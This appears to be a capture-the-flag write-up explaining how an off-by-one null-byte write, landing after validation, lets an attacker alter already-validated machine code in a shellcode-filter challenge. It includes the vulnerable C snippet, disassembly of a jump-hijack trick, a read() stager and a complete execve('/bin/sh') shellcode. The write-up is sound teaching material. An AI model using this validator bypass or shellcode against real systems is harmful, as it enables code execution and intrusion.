# Bug
Single null-byte overflow (off-by-one bug) in second input (program name), combined with a ToCToU:
```
    validate_program(p->code, bytes_read);
    printf("\nNamnge ditt program: ");
    if ( (bytes_read = read(STDIN_FILENO, p->name, NAME_MAX_LEN)) == -1){
        DIE("read");
    }

    p->name[bytes_read] = 0; // index 16 is the first byte in p->code
                             // happens after program is validated
```

# Solution
* By placing well chosen `mov rax, IMMEDIATE` (or `mov rbx`), hijack the control flow by overwriting the first byte in this instruction with NULL.
* In the example solution below we change `mov rax,0xffffffffe9eb00ff` into `add bh,al ; sar bh,0x0 ; jmp -0x15`.
* This allows us to execute the bytes we put in `p->name` (name of our "program") as code.
* The code we placed in `p->name` is a read() stager in order to let us input more shellcode.

## Some snapshots of the exploit method
### At validation 
After program has been input, before name has been input
```
// p->name,         0x7f8354c34000:	add    BYTE PTR [rax],al
// yet to be        0x7f8354c34002:	add    BYTE PTR [rax],al
// written.         0x7f8354c34004:	add    BYTE PTR [rax],al
                    0x7f8354c34006:	add    BYTE PTR [rax],al
                    0x7f8354c34008:	add    BYTE PTR [rax],al
                    0x7f8354c3400a:	add    BYTE PTR [rax],al
                    0x7f8354c3400c:	add    BYTE PTR [rax],al
                    0x7f8354c3400e:	add    BYTE PTR [rax],al
// p->code that  => 0x7f8354c34010:	mov    rax,0xffffffffe9eb00ff
// passes           0x7f8354c34017:	ret 
// validation       0x7f8354c34018:	add    BYTE PTR [rax],al
                    0x7f8354c3401a:	add    BYTE PTR [rax],al
                    0x7f8354c3401c:	add    BYTE PTR [rax],al
                    0x7f8354c3401e:	add    BYTE PTR [rax],al
                    0x7f8354c34020:	add    BYTE PTR [rax],al
```
                   
### At user program runtime, after name has been input
```
// p->name          0x7f8354c34000:	mov    rsi,rdi <------------+
                    0x7f8354c34003:	mov    edx,0x32             |
                    0x7f8354c34008:	xor    rdi,rdi              |
                    0x7f8354c3400b:	xor    rax,rax              |
                    0x7f8354c3400e:	syscall // SYS_read stager  |
// p->code, null => 0x7f8354c34010:	add    bh,al                |
// byte overwrite   0x7f8354c34012:	sar    bh,0x0               |
// changed the      0x7f8354c34015:	jmp    0x7f8354c34000 ->----+
// already          0x7f8354c34017:	ret    
// validated        0x7f8354c34018:	add    BYTE PTR [rax],al
// instruction      0x7f8354c3401a:	add    BYTE PTR [rax],al
```

### With our read-stager called, we input a simple "/bin/sh" execve shellcode
```
                    0x7f8354c34000:	mov    rsi,rdi
                    0x7f8354c34003:	mov    edx,0x32
                    0x7f8354c34008:	xor    rdi,rdi
                    0x7f8354c3400b:	xor    rax,rax
                    0x7f8354c3400e:	syscall     // SYS_read
                 => 0x7f8354c34010:	push   0x68
                    0x7f8354c34012:	movabs rax,0x732f2f2f6e69622f
                    0x7f8354c3401c:	push   rax
                    0x7f8354c3401d:	mov    rdi,rsp
                    0x7f8354c34020:	push   0x1016972
                    0x7f8354c34025:	xor    DWORD PTR [rsp],0x1010101
                    0x7f8354c3402c:	xor    esi,esi
                    0x7f8354c3402e:	push   rsi
                    0x7f8354c3402f:	push   0x8
                    0x7f8354c34031:	pop    rsi
                    0x7f8354c34032:	add    rsi,rsp
                    0x7f8354c34035:	push   rsi
                    0x7f8354c34036:	mov    rsi,rsp
                    0x7f8354c34039:	xor    edx,edx
                    0x7f8354c3403b:	push   0x3b
                    0x7f8354c3403d:	pop    rax
                    0x7f8354c3403e:	syscall     // SYS_execve
```
